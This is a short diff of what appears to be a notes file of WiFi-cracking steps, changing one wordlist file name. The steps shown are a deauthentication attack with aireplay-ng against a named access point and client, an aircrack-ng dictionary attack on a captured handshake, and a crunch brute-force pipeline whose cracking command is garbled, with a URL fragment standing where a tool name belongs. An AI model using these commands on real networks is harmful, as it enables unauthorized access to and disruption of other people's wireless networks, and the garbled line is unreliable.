@@ -8,7 +8,7 @@
 
 6) sudo aireplay-ng -0 5 -a 9C:21:6A:BC:B2:BC -c CC:3A:61:45:EA:B3 [-e TP-LINK_CA47B4] mon0
 
-7) aircrack-ng -w psswd-arcrk-ng -b 9C:21:6A:BC:B2:BC output*.cap
+7) aircrack-ng -w psswd-aircrk-ng -b 9C:21:6A:BC:B2:BC output*.cap
 
 a. crunch 8 12 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*&.#$ ;,_@~'/\[]<>()^%" | pyri://www.google.ca/t -r output*.cap -b 9C:21:6A:BC:B2:BC -i - attack_passthrough
 
